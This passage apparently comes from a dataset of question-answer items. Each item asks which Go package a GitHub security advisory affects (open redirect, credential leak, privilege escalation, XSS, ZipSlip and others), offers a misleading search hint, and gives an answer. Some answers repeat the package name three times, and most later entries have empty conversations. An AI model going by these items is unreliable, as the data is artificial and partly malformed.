using the HTTPS protocol and that it exists on a domain associated with the application.\n\nAn attacker is able to use this unintended functionality to redirect users to malicious sites. This particular security issue allows the attacker to make a phishing attempt seem much more trustworthy to a user of the web application as the initial site before redirection is familiar to them, as well as the actual URL which they have theoretically visited frequently. \n\nWhile this security issue does not directly impact the security of the web application, it is still not an acceptable scenario for the reasons mentioned above. \n\n### Patches\nf0cb75e1e102f95f91e9254c66c797e821857690 fix(handlers): logout redirection validation (#1908) [v4.28.0](https://github.com/authelia/authelia/releases/tag/v4.28.0)\n\n### Workarounds\nUsing a reverse proxy to strip the query parameter from the affected endpoint. \n\n### References\nhttps://github.com/authelia/authelia/pull/1908\n\n[CWE-601](https://cwe.mitre.org/data/definitions/601.html)\n\n[Authelia v4.28.0](https://github.com/authelia/authelia/tree/v4.28.0)\n\n### For more information\nIf you have any questions or comments about this advisory, please [contact us](https://github.com/authelia/authelia#contact-options). You may also contact us to request creating a back-ported fix for this if you are able to explain why you cannot upgrade; however upgrading is highly preferable. . Top 1 search result is go:github.com/concourse/concourse. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/authelia/authelia/v4."}]}, {"id": "GHSA-gc89-7gcr-jxqc", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: When the user sends a build request that contains a Git URL that contains credentials and the build creates a provenance attestation describing that build, these credentials could be visible from the provenance attestation.\n\nGit URL can be passed in two ways:\n\n1) Invoking build directly from a URL with credentials.\n\n```\nbuildctl build --frontend dockerfile.v0 --context https://<credentials>@url/repo.git\n```\n\nEquivalent in `docker buildx` would be\n\n```\ndocker buildx build https://<credentials>@url/repo.git\n```\n\n2) If the client sends additional VCS info hint parameters on builds from a local source. Usually, that would mean reading the origin URL from `.git/config` file. \n\nThanks to Oscar Alberto Tovar for discovering the issue.\n\n### Impact\nWhen a build is performed under specific conditions where credentials were passed to BuildKit they may be visible to everyone who has access to provenance attestation.\n\nProvenance attestations and VCS info hints were added in version v0.11.0. Previous versions are not vulnerable.\n\nIn v0.10, when building directly from Git URL, the same URL could be visible in `BuildInfo` structure that is a predecessor of Provenance attestations. Previous versions are not vulnerable.\n\nNote: [Docker Build-push Github action](https://github.com/docker/build-push-action) builds from Git URLs by default but **is not** affected by this issue even when working with private repositories because the credentials are passed [with build secrets](https://github.com/docker/build-push-action/blob/v4.0.0/src/context.ts#L203) and not with URLs.\n\n### Patches\nBug is fixed in v0.11.4 . \n\n### Workarounds\nIt is recommended to pass credentials with build secrets when building directly from Git URL as a more secure alternative than modifying the URL.\n\nIn Docker Buildx, VCS info hint can be disabled by setting `BUILDX_GIT_INFO=0`. `buildctl` does not set VCS hints based on `.git` directory, and values would need to be passed manually with `--opt`.\n\n\n### References\n- Inline credentials in URLs deprecated in RFC3986 https://www.rfc-editor.org/rfc/rfc3986#section-3.2.1\n\n. Top 1 search result is go:github.com/hyperledger/fabric. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/moby/buildkit."}]}, {"id": "GHSA-rqm8-q8j9-662f", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Summary\nA vulnerability was identified in Nomad and Nomad Enterprise (\u201cNomad\u201d) such that a user with the submit-job ACL capability can submit a job that can escalate to management-level privileges. This vulnerability, CVE-2023-1299, was introduced in Nomad 1.5.0 and fixed in Nomad 1.5.1.\n\n### Background\nNomad 1.4.0 introduced the concept of workload identity so that tasks can access variables without needing to access them through Nomad HTTP API with an ACL token.\n\nIn 1.5.0, the identity block was introduced, which exposes the workload identity token to the workload so it can access Nomad HTTP API via a unix domain socket without configuring mTLS.\n\n### Details\nDuring internal testing, we discovered it was possible to abuse the workload identity to elevate to management-level privilege if the workload identity did not have any attached ACL policies.\n\n### Remediation\nCustomers should evaluate the risk associated with this issue and consider upgrading to Nomad 1.5.1 or newer. See Nomad\u2019s Upgrading for general guidance on this process.. Top 1 search result is go:github.com/gagliardetto/binary. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/hashicorp/nomad."}]}, {"id": "GHSA-vq4h-9ghm-qmrr", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: HashiCorp Vault's implementation of Shamir's secret sharing used precomputed table lookups, and was vulnerable to cache-timing attacks. An attacker with access to, and the ability to observe a large number of unseal operations on the host through a side channel may reduce the search space of a brute force effort to recover the Shamir shares. Fixed in Vault 1.13.1, 1.12.5, and 1.11.9.. Top 1 search result is go:github.com/opencontainers/runc. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/hashicorp/vault github.com/hashicorp/vault github.com/hashicorp/vault."}]}, {"id": "GHSA-hwc3-3qh6-r4gg", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: HashiCorp Vault's PKI mount issuer endpoints did not correctly authorize access to remove an issuer or modify issuer metadata, potentially resulting in denial of service of the PKI mount. This bug did not affect public or private key material, trust chains or certificate issuance. Fixed in Vault 1.13.1, 1.12.5, and 1.11.9.. Top 1 search result is go:github.com/bitly/oauth2_proxy. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/hashicorp/vault github.com/hashicorp/vault github.com/hashicorp/vault."}]}, {"id": "GHSA-v829-x6hh-cqfq", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Summary\n\nFuzz testing, by Ada Logics and sponsored by the CNCF, identified a [vulnerability](https://github.com/crossplane/crossplane-runtime/security/advisories/GHSA-vfvj-3m3g-m532) in the `fieldpath` package from `crossplane/crossplane-runtime` that an already highly privileged Crossplane user able to create or update Compositions could leverage to cause an out of memory panic in Crossplane.\n\n### Details\n\nCompositions allow users to specify patches inserting elements into arrays at an arbitrary index. When a Composition is selected for a Composite Resource, patches are evaluated and if a specified index is greater than the current size of the target slice, that slice's size will be increased to the specified index, which could lead to an excessive amount of memory usage and therefore the Pod being OOM-Killed. The index is already capped to the maximum value for a uint32 (4294967295) when parsed, but that is still an unnecessarily large value.\n\n### Workaround\n\nUsers can restrict write privileges on Compositions to only admin users as a workaround.. Top 1 search result is go:github.com/russellhaering/goxmldsig. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/crossplane/crossplane github.com/crossplane/crossplane github.com/crossplane/crossplane."}]}, {"id": "GHSA-m8cg-xc2p-r3fc", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\nIt was found that rootless runc makes `/sys/fs/cgroup` writable in following conditons:\n1. when runc is executed inside the user namespace, and the `config.json` does not specify the cgroup namespace to be unshared (e.g.., `(docker|podman|nerdctl) run --cgroupns=host`, with Rootless Docker/Podman/nerdctl)\n2. or, when runc is executed outside the user namespace, and `/sys` is mounted with `rbind, ro` (e.g., `runc spec --rootless`; this condition is very rare)\n\nA container may gain the write access to user-owned cgroup hierarchy `/sys/fs/cgroup/user.slice/...` on the host .\nOther users's cgroup hierarchies are not affected.\n\n### Patches\nv1.1.5 (planned)\n\n### Workarounds\n- Condition 1: Unshare the cgroup namespace (`(docker|podman|nerdctl) run --cgroupns=private)`. This is the default behavior of Docker/Podman/nerdctl on cgroup v2 hosts.\n- Condition 2 (very rare): add `/sys/fs/cgroup` to `maskedPaths`\n. Top 1 search result is go:github.com/tendermint/tendermint. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/opencontainers/runc."}]}, {"id": "GHSA-xvfj-84vc-hrmf", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Cross-site Scripting (XSS) - Stored in GitHub repository answerdev/answer prior to 1.0.7.. Top 1 search result is go:github.com/bitly/oauth2_proxy. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/answerdev/answer."}]}, {"id": "GHSA-hjv9-hm2f-rpcj", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Grafana is an open-source platform for monitoring and observability. Starting with the 8.1 branch, Grafana had a stored XSS vulnerability affecting the core plugin GeoMap. The stored XSS vulnerability was possible due to map attributions weren't properly sanitized and allowed arbitrary JavaScript to be executed in the context of the currently authorized user of the Grafana instance. An attacker needs to have the Editor role in order to change a panel to include a map attribution containing JavaScript. This means that vertical privilege escalation is possible, where a user with Editor role can change to a known password for a user having Admin role if the user with Admin role executes malicious JavaScript viewing a dashboard. Users may upgrade to version 8.5.21, 9.2.13 and 9.3.8 to receive a fix.. Top 1 search result is go:github.com/hpcng/singularity. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/grafana/grafana github.com/grafana/grafana github.com/grafana/grafana."}]}, {"id": "GHSA-5g39-ppwg-6xx8", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Impact\nZipSlip issue when use fsutil package to unzip files.\nWhen users use zip.Unzip to unzip zip files from a malicious attacker, they may be vulnerable to path traversal.\n\nPatches\nIt has been fixed in v0.0.34, Please upgrade version to v0.0.34 or above.\n\nWorkarounds\nNo, users have to upgrade version.\n\nSpecific Go Packages Affected\ngithub.com/dablelv/go-huge-util/zip\n\nReferences. Top 1 search result is go:github.com/kubernetes/kubernetes. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/dablelv/go-huge-util."}]}, {"id": "GHSA-8gg8-wr4j-v2wr", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Gophish through 0.12.1 allows attackers to cause a Denial of Service (DoS) via a crafted payload involving autofocus.. Top 1 search result is go:github.com/sylabs/sif. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/gophish/gophish."}]}, {"id": "GHSA-g2j6-57v7-gm8c", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\nIt was found that AppArmor, and potentially SELinux, can be bypassed when `/proc` inside the container is symlinked with a specific mount configuration.\n\n### Patches\nFixed in runc v1.1.5, by prohibiting symlinked `/proc`: https://github.com/opencontainers/runc/pull/3785\n\nThis PR fixes CVE-2023-27561 as well.\n\n### Workarounds\nAvoid using an untrusted container image.\n\n. Top 1 search result is go:github.com/sourcegraph/sourcegraph. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/opencontainers/runc."}]}, {"id": "GHSA-fx2v-qfhr-4chv", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\n\nZipSlip issue when use fsutil package to unzip files.\nWhen users use fsutil.Unzip to unzip zip files from a malicious attacker, they may be vulnerable to path traversal. \n\n### Patches\n\nIt has been fixed in v0.6.0, Please upgrade version to v0.6.0 or above.\n\n### Workarounds\nNo, users have to upgrade version.. Top 1 search result is go:github.com/grafana/grafana. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/gookit/goutil."}]}, {"id": "GHSA-rvjp-8qj4-8p29", "conversations": []}, {"id": "GHSA-x5rv-w9pm-8qp8", "conversations": []}, {"id": "GHSA-9hj7-v56g-rhf6", "conversations": []}, {"id": "GHSA-f6hc-9g49-xmx7", "conversations": []}, {"id": "GHSA-83qr-c7m9-wmgw", "conversations": []}, {"id": "GHSA-qrrg-gw7w-vp76", "conversations": []}, {"id": "GHSA-cp96-jpmq-xrr2", "conversations": []}, {"id": "GHSA-ch7v-37xg-75ph", "conversations": []}, {"id": "GHSA-3cgw-hfw7-wc7j", "conversations": []}, {"id": "GHSA-jh36-q97c-9928", "conversations": []}, {"id": "GHSA-x623-hr8h-7g5v", "conversations": []}, {"id": "GHSA-4xgv-j62q-h3rj", "conversations": []}, {"id": "GHSA-74fp-r6jw-h4mp", "conversations": []}, {"id": "GHSA-w55j-f7vx-6q37", "conversations": []}, {"id": "GHSA-qgc7-mgm3-q253", "conversations": []}, {"id": "GHSA-hmfx-3pcx-653p", "conversations": []}, {"id": "GHSA-4gj3-6r43-3wfc", "conversations": []}, {"id": "GHSA-3jfq-742w-xg8j", "conversations": []}, {"id": "GHSA-259w-8hf6-59c2", "conversations": []}, {"id": "GHSA-jp7v-3587-2956", "conversations": []}, {"id": "GHSA-p7wj-c85f-xq9h", "conversations": []}, {"id": "GHSA-pfvh-p8qp-9ww9", "conversations": []}, {"id": "GHSA-8mjg-8c8g-6h85", "conversations": []}, {"id": "GHSA-66p8-j459-rq63", "conversations": []}, {"id": "GHSA-pwcw-6f5g-gxf8", "conversations": []}, {"id": "GHSA-9w8x-5hv5-r6gw", "conversations": []}, {"id": "GHSA-p8r3-83r8-jwj5", "conversations": []}, {"id": "GHSA-jpxj-2jvg-6jv9", "conversations": []}, {"id": "GHSA-5r5m-65gx-7vrh", "conversations": []}, {"id": "GHSA-5vx9-j5cw-47vq", "conversations": []}, {"id": "GHSA-q264-w97q-q778", "conversations": []}, {"id": "GHSA-33m6-q9v5-62r7", "conversations": []}, {"id": "GHSA-9xm8-8qvc-vw3p", "conversations": []}, {"id": "GHSA-54q4-74p3-mgcw", "conversations": []}, {"id": "GHSA-6cvf-m58q-h9wf", "conversations": []}, {"id": "GHSA-8cfg-vx93-jvxw", "conversations": []}, {"id": "GHSA-p4g4-wgrh-qrg2", "conversations": []}, {"id": "GHSA-hjmr-xm25-36mh", "conversations": []}, {"id": "GHSA-87x9-7grx-m28v", "conversations": []}, {"id": "GHSA-r887-gfxh-m9rr", "conversations": []}, {"id": "GHSA-w479-w22g-cffh", "conversations": []}, {"id": "GHSA-mv6w-j4xc-qpfw", "conversations": []}, {"id": "GHSA-vvpx-j8f3-3w6h", "conversations": []}, {"id": "GHSA-qx34-47fc-vv79", "conversations": []}, {"id": "GHSA-hxp2-xqf3-v83h", "conversations": []}, {"id": "GHSA-2h6c-j3gf-xp9r", "conversations": []}, {"id": "GHSA-2g5j-5x95-r6hr", "conversations": []}, {"id": "GHSA-4cwh-8w4g-jxxh", "conversations": []}, {"id": "GHSA-r2h5-3hgw-8j34", "conversations": []}, {"id": "GHSA-qpm3-vr34-h8w8", "conversations": []}, {"id": "GHSA-p64j-r5f4-pwwx", "conversations": []}, {"id": "GHSA-65px-4cpf-697r", "conversations": []}, {"id": "GHSA-wr8h-w969-36m8", "conversations": []}, {"id": "GHSA-xhjq-w7xm-p8qj", "conversations": []}, {"id": "GHSA-rmw8-7823-wp7f", "conversations": []}, {"id": "GHSA-hr4f-6jh8-f2vq", "conversations": []}, {"id": "GHSA-q24m-6h38-5xj8", "conversations": []}, {"id": "GHSA-4r5x-x283-wm96", "conversations": []}, {"id": "GHSA-rcjv-mgp8-qvmr", "conversations": []}, {"id": "GHSA-pffg-92cg-xf5c", "conversations": []}, {"id": "GHSA-8gwj-m6vh-2g6j", "conversations": []}, {"id": "GHSA-35c7-w35f-xwgh", "conversations": []}, {"id": "GHSA-7fxm-f474-hf8w", "conversations": []}, {"id": "GHSA-94w9-97p3-p368", "conversations": []}, {"id": "GHSA-jq35-85cj-fj4p", "conversations": []}, {"id": "GHSA-4374-p667-p6c8", "conversations": []}, {"id": "GHSA-g6pq-x539-7w4j", "conversations": []}, {"id": "GHSA-498w-5j49-vqjg", "conversations": []}, {"id": "GHSA-v683-rcxx-vpff", "conversations": []}, {"id": "GHSA-4x5q-q7wc-q22p", "conversations": []}, {"id": "GHSA-jg7w-cxjv-98c2", "conversations": []}, {"id": "GHSA-9pc8-m4vp-ggvf", "conversations": []}, {"id": "GHSA-cqvv-r3g3-26rf", "conversations": []}, {"id": "GHSA-m5jc-r4gf-c6p8", "conversations": []}, {"id": "GHSA-622h-h2p8-743x", "conversations": []}, {"id": "GHSA-q78c-gwqw-jcmc", "conversations": []}, {"id": "GHSA-267v-3v32-g6q5", "conversations": []}, {"id": "GHSA-v9jh-j8px-98vq", "conversations": []}, {"id": "GHSA-7p92-x423-vwj6", "conversations": []}, {"id": "GHSA-4frv-5fj6-4p25", "conversations": []}, {"id": "GHSA-9wmc-rg4h-28wv", "conversations": []}, {"id": "GHSA-75j7-w798-cwwx", "conversations": []}, {"id": "GHSA-vx74-f528-fxqg", "conversations": []}, {"id": "GHSA-mjq6-pv9c-qppq", "conversations": []}, {"id": "GHSA-mq6f-5xh5-hgcf", "conversations": []}, {"id": "GHSA-mv73-f69x-444p", "conversations": []}, {"id": "GHSA-5wj4-wffq-3378", "conversations": []}, {"id": "GHSA-47xw-vw6m-w9fq", "conversations": []}, {"id": "GHSA-w6rp-vxj2-fjhr", "conversations": []}, {"id": "GHSA-m425-mq94-257g", "conversations": []}, {"id": "GHSA-mr45-rx8q-wcm9", "conversations": []}, {"id": "GHSA-hmq4-c2r4-5q8h", "conversations": []}, {"id": "GHSA-r847-6w6h-r8g4", "conversations": []}, {"id": "GHSA-3q6m-v84f-6p9h", "conversations": []}, {"id": "GHSA-7v4p-328v-8v5g", "conversations": []}, {"id": "GHSA-mc97-99j4-vm2v", "conversations": []}, {"id": "GHSA-gvrm-w2f9-f77q", "conversations": []}, {"id": "GHSA-fr2g-9hjm-wr23", "conversations": []}, {"id": "GHSA-fw9c-75hh-89p6", "conversations": []}, {"id": "GHSA-37x5-qpm8-53rq", "conversations": []}, {"id": "GHSA-34p5-jp77-fcrc", "conversations": []}, {"id": "GHSA-c45c-39f6-6gw9", "conversations": []}, {"id": "GHSA-3hc7-2xcc-7p8f", "conversations": []}, {"id": "GHSA-h2ph-9r76-37v5", "conversations": []}, {"id": "GHSA-q9hr-j4rf-8fjc", "conversations": []}, {"id": "GHSA-8686-4cr3-76wj", "conversations": []}, {"id": "GHSA-vjhf-8vqx-vqpq", "conversations": []}, {"id": "GHSA-v9mp-j8g7-2q6m", "conversations": []}, {"id": "GHSA-cq4p-vp5q-4522", "conversations": []}, {"id": "GHSA-3244-8mff-w398", "conversations": []}, {"id": "GHSA-9h7x-9pmh-7gg8", "conversations": []}, {"id": "GHSA-gqx8-hxmv-c4v4", "conversations": []}, {"id": "GHSA-2x48-p6cq-5xcw", "conversations": []}, {"id": "GHSA-jxgp-jgh3-8jc8", "conversations": []}, {"id": "GHSA-fpjc-cxr6-w6h8", "conversations": []}, {"id": "GHSA-pcvh-px2p-vmxw", "conversations": []}, {"id": "GHSA-7jf5-fvgf-48c6", "conversations": []}, {"id": "GHSA-8fcj-gf77-47mg", "conversations": []}, {"id": "GHSA-7m72-mh5r-6j3r", "conversations": []}, {"id": "GHSA-8c69-r38j-rpfj", "conversations": []}, {"id": "GHSA-g25r-gvq3-wrq7", "conversations": []}, {"id": "GHSA-fgwp-pwqq-g3w4", "conversations": []}, {"id": "GHSA-6rrr-78xp-5jp8", "conversations": []}, {"id": "GHSA-7p8m-22h4-9pj7", "conversations": []}, {"id": "GHSA-6p4m-hw2h-6gmw", "conversations": []}, {"id": "GHSA-wr3c-g326-486c", "conversations": []}, {"id": "GHSA-x477-fq37-q5wr", "conversations": []}, {"id": "GHSA-qrg7-hfx7-95c5", "conversations": []}, {"id": "GHSA-x22v-qgm2-7qc7", "conversations": []}, {"id": "GHSA-g5vm-525q-r66c", "conversations": []}, {"id": "GHSA-5465-xc2j-6p84", "conversations": []}, {"id": "GHSA-c653-6hhg-9x92", "conversations": []}, {"id": "GHSA-r894-5r7v-7rx3", "conversations": []}, {"id": "GHSA-fxg5-wq6x-vr4w", "conversations": []}, {"id": "GHSA-pc99-qmg4-rcff", "conversations": []}, {"id": "GHSA-hj4g-4w36-x8hp", "conversations": []}, {"id": "GHSA-89qm-wcmw-3mgg", "conversations": []}, {"id": "GHSA-g7mw-9pf9-p2pm", "conversations": []}, {"id": "GHSA-v4w5-r2xc-7f8h", "conversations": []}, {"id": "GHSA-3vp4-m3rf-835h", "conversations": []}, {"id": "GHSA-92wq-q9pq-gw47", "conversations": []}, {"id": "GHSA-22fx-6r9m-r8h9", "conversations": []}, {"id": "GHSA-jqvr-j2vg-gjrv", "conversations": []}, {"id": "GHSA-hgv6-w7r3-w4qw", "conversations": []}, {"id": "GHSA-7g2v-2frm-rg94", "conversations": []}, {"id": "GHSA-pvrc-wvj2-f59p", "conversations": []}, {"id": "GHSA-j327-c69h-4gh8", "conversations": []}, {"id": "GHSA-qvqg-6rp8-4p9h", "conversations": []}, {"id": "GHSA-qjrq-hm79-49ww", "conversations": []}, {"id": "GHSA-g82w-58jf-gcxx", "conversations": []}, {"id": "GHSA-863x-868h-968x", "conversations": []}, {"id": "GHSA-2q89-485c-9j2x", "conversations": []}, {"id": "GHSA-33hq-f2mf-jm3c", "conversations": []}, {"id": "GHSA-9x7h-ggc3-xg47", "conversations": []}, {"id": "GHSA-m974-xj4j-7qv5", "conversations": []}, {"id": "GHSA-wmfc-g86p-fjvr", "conversations": []}, {"id": "GHSA-frqx-jfcm-6jjr", "conversations": []}, {"id": "GHSA-p744-4q6p-hvc2", "conversations": []}, {"id": "GHSA-jv3f-7m33-qp65", "conversations": []}, {"id": "GHSA-93xx-cvmc-9w3v", "conversations": []}, {"id": "GHSA-jmp2-wc4p-wfh2", "conversations": []}, {"id": "GHSA-fwj4-72fm-c93g", "conversations": []}, {"id": "GHSA-w7jw-q4fg-qc4c", "conversations": []}, {"id": "GHSA-qmqw-r4x6-3w2q", "conversations": []}, {"id": "GHSA-3p4g-rcw5-8298", "conversations": []}, {"id": "GHSA-g47h-fgcw-g4ph", "conversations": []}, {"id": "GHSA-2h5h-59f5-c5x9", "conversations": []}, {"id": "GHSA-2h44-x2wx-49f4", "conversations": []}, {"id": "GHSA-f7qw-jj9c-rpq9", "conversations": []}, {"id": "GHSA-pqj7-jx24-wj7w", "conversations": []}, {"id": "GHSA-mv7x-27pc-8c96", "conversations": []}, {"id": "GHSA-hqxw-f8mx-cpmw", "conversations": []}, {"id": "GHSA-2c4m-59x9-fr2g", "conversations": []}, {"id": "GHSA-q3j6-22wf-3jh9", "conversations": []}, {"id": "GHSA-5mmw-p5qv-w3x5", "conversations": []}, {"id": "GHSA-6fwg-jrfw-ff7p", "conversations": []}, {"id": "GHSA-m8rw-rcpq-2vp2", "conversations": []}, {"id": "GHSA-92cg-ghq6-9587", "conversations": []}, {"id": "GHSA-26hr-q2wp-rvc5", "conversations": []}, {"id": "GHSA-jpfp-xq3p-4h3r", "conversations": []}, {"id": "GHSA-8g85-whqh-cr2f", "conversations": []}, {"id": "GHSA-hj4r-2c9c-29h3", "conversations": []}, {"id": "GHSA-99jv-8292-2hpm", "conversations": []}, {"id": "GHSA-4rgc-5g6r-2rjf", "conversations": []}, {"id": "GHSA-7664-hcp7-f497", "conversations": []}, {"id": "GHSA-8j98-cjfr-qx3h", "conversations": []}, {"id": "GHSA-x9qq-236j-gj97", "conversations": []}, {"id": "GHSA-7ww5-4wqc-m92c", "conversations": []}, {"id": "GHSA-j3rq-4xjw-xg63", "conversations": []}, {"id": "GHSA-wq59-4q6r-635r", "conversations": []}, {"id": "GHSA-wpmx-564x-h2mh", "conversations": []}, {"id": "GHSA-7f9x-gw85-8grf", "conversations": []}, {"id": "GHSA-v7hc-87jc-qrrr", "conversations": []}, {"id": "GHSA-fvhj-4qfh-q2hm", "conversations": []}, {"id": "GHSA-6p62-6cg9-f5f5", "conversations": []}, {"id": "GHSA-63cv-4pc2-4fcf", "conversations": []}, {"id": "GHSA-mhpq-9638-x6pw", "conversations": []}, {"id": "GHSA-mw99-9chc-xw7r", "conversations": []}, {"id": "GHSA-rxg9-hgq7-8pwx", "conversations": []}, {"id": "GHSA-jcrr-rr6w-8c83", "conversations": []}, {"id": "GHSA-3m87-5598-2v4f", "conversations": []}, {"id": "GHSA-p6fh-xc6r-g5hw", "conversations": []}, {"id": "GHSA-9w7j-q3xw-p9vh", "conversations": []}, {"id": "GHSA-3633-5h82-39pq", "conversations": []}, {"id": "GHSA-jr8j-2jhp-m67v", "conversations": []}, {"id": "GHSA-8c6p-v837-77f6", "conversations": []}, {"id": "GHSA-m7w4-q5vg-5xfp", "conversations": []}, {"id": "GHSA-qv98-3369-g364", "conversations": []}, {"id": "GHSA-69cg-p879-7622", "conversations": []}, {"id": "GHSA-5rc4-v5mj-g8c4", "conversations": []}, {"id": "GHSA-8gw7-4j42-w388", "conversations": []}, {"id": "GHSA-xhmf-mmv2-4hhx", "conversations": []}, {"id": "GHSA-54qx-8p8w-xhg8", "conversations": []}, {"id": "GHSA-7cgv-v83v-rr87", "conversations": []}, {"id": "GHSA-m69r-9g56-7mv8", "conversations": []}, {"id": "GHSA-gmhj-xjfh-cf6m", "conversations": []}, {"id": "GHSA-rc4r-wh2q-q6c4", "conversations": []}, {"id": "GHSA-pfw4-xjgm-267c", "conversations": []}, {"id": "GHSA-g7j7-h4q8-8w2f", "conversations": []}, {"id": "GHSA-phjr-8j92-w5v7", "conversations": []}, {"id": "GHSA-hvw3-p9px-gpc9", "conversations": []}, {"id": "GHSA-xwf3-6rgv-939r", "conversations": []}, {"id": "GHSA-r947-2crg-xc39", "conversations": []}, {"id": "GHSA-mv8x-668m-53fg", "conversations": []}, {"id": "GHSA-9vm3-r8gq-cr6x", "conversations": []}, {"id": "GHSA-c9qr-f6c8-rgxf", "conversations": []}, {"id": "GHSA-4p6f-m4f9-ch88", "conversations": []}, {"id": "GHSA-f524-rf33-2jjr", "conversations": []}, {"id": "GHSA-fg25-gq9g-32mx", "conversations": []}, {"id": "GHSA-xx9w-464f-7h6f", "conversations": []}, {"id": "GHSA-fjm8-m7m6-2fjp", "conversations": []}, {"id": "GHSA-34vw-m4rh-r36p", "conversations": []}, {"id": "GHSA-28q9-9c3g-v3f9", "conversations": []}, {"id": "GHSA-p2g7-xwvr-rrw3", "conversations": []}, {"id": "GHSA-3637-v6vq-xqqw", "conversations": []}, {"id": "GHSA-rp4v-hhm6-rcv9", "conversations": []}, {"id": "GHSA-cf7g-cm7q-rq7f", "conversations": []}, {"id": "GHSA-gwc9-m7rh-j2ww", "conversations": []}, {"id": "GHSA-pwq7-f7f9-cm2j", "conversations": []}, {"id": "GHSA-qf7j-25g9-r63f", "conversations": []}, {"id": "GHSA-crxj-hrmp-4rwf", "conversations": []}, {"id": "GHSA-4wjj-jwc9-2x96", "conversations": []}, {"id": "GHSA-q76q-q8hw-hmpw", "conversations": []}, {"id": "GHSA-ggf6-638m-vqmg", "conversations": []}, {"id": "GHSA-jf8p-3vjh-pq94", "conversations": []}, {"id": "GHSA-7hgc-php5-77qq", "conversations": []}, {"id": "GHSA-m74x-fxjh-3qh9", "conversations": []}, {"id": "GHSA-vqp6-rc3h-83cp", "conversations": []}, {"id": "GHSA-5m7g-pj8w-7593", "conversations": []}, {"id": "GHSA-6c6p-h79f-g6p4", "conversations": []}, {"id": "GHSA-3gfj-fxx4-f22w", "conversations": []}, {"id": "GHSA-gw2g-hhc9-wgjh", "conversations": []}, {"id": "GHSA-5jph-wrq7-v9hf", "conversations": []}, {"id": "GHSA-j2jp-wvqg-wc2g", "conversations": []}, {"id": "GHSA-hc82-w9v8-83pr", "conversations": []}, {"id": "GHSA-jr77-8gx4-h5qh", "conversations": []}, {"id": "GHSA-7wg4-8m5p-hrfg", "conversations": []}, {"id": "GHSA-cvh4-cjc9-84qm", "conversations": []}, {"id": "GHSA-v42f-hq78-8c5m", "conversations": []}, {"id": "GHSA-7fxj-fr3v-r9gj", "conversations": []}, {"id": "GHSA-prjq-f4q3-fvfr", "conversations": []}, {"id": "GHSA-22vc-5pgw-644q", "conversations": []}, {"id": "GHSA-9fmc-5fq4-5jwh", "conversations": []}, {"id": "GHSA-672p-m5jq-mrh8", "conversations": []}, {"id": "GHSA-99g5-5643-xphp", "conversations": []}, {"id": "GHSA-vp35-85q5-9f25", "conversations": []}, {"id": "GHSA-pp3f-xrw5-q5j4", "conversations": []}, {"id": "GHSA-2chg-86hq-7w38", "conversations": []}, {"id": "GHSA-qccm-wmcq-pwr6", "conversations": []}, {"id": "GHSA-m5xf-x7q6-3rm7", "conversations": []}, {"id": "GHSA-6cqj-6969-p57x", "conversations": []}, {"id": "GHSA-f92v-grc2-w2fg", "conversations": []}, {"id": "GHSA-gwj5-wp6r-5q9f", "conversations": []}, {"id": "GHSA-pfhr-pccp-hwmh", "conversations": []}, {"id": "GHSA-739f-hw6h-7wq8", "conversations": []}, {"id": "GHSA-8449-7gc2-pwrp", "conversations": []}, {"id": "GHSA-6xf3-5hp7-xqqg", "conversations": []}, {"id": "GHSA-cvx8-ppmc-78hm", "conversations": []}, {"id": "GHSA-h3qm-jrrf-cgj3", "conversations": []}, {"id": "GHSA-rqmg-hrg4-fm69", "conversations": []}, {"id": "GHSA-grvv-h2f9-7v9c", "conversations": []}, {"id": "GHSA-c8fj-4pm8-mp2c", "conversations": []}, {"id": "GHSA-vjxv-45g9-9296", "conversations": []}, {"id": "GHSA-7hfp-qfw3-5jxh", "conversations": []}, {"id": "GHSA-9x4h-8wgm-8xfg", "conversations": []}, {"id": "GHSA-pp3f-98qg-5g75", "conversations": []}, {"id": "GHSA-7ggc-5r84-xf54", "conversations": []}, {"id": "GHSA-8r94-4h3c-939f", "conversations": []}, {"id": "GHSA-rqph-25q9-9jhp", "conversations": []}, {"id": "GHSA-jxqv-jcvh-7gr4", "conversations": []}, {"id": "GHSA-2m4x-4q9j-w97g", "conversations": []}, {"id": "GHSA-qpx3-9565-5xwm", "conversations": []}, {"id": "GHSA-95f9-94vc-665h", "conversations": []}, {"id": "GHSA-96jv-vj39-x4j6", "conversations": []}, {"id": "GHSA-xv59-gc3r-rf92", "conversations": []}, {"id": "GHSA-7943-82jg-wmw5", "conversations": []}, {"id": "GHSA-wc5v-r48v-g4vh", "conversations": []}, {"id": "GHSA-wrcr-x4qj-j543", "conversations": []}, {"id": "GHSA-pmjg-52h9-72qv", "conversations": []}, {"id": "GHSA-f2gr-7299-487h", "conversations": []}, {"id": "GHSA-m7gr-5w5g-36jf", "conversations": []}, {"id": "GHSA-vwm6-qc77-v2rh", "conversations": []}, {"id": "GHSA-477v-w82m-634j", "conversations": []}, {"id": 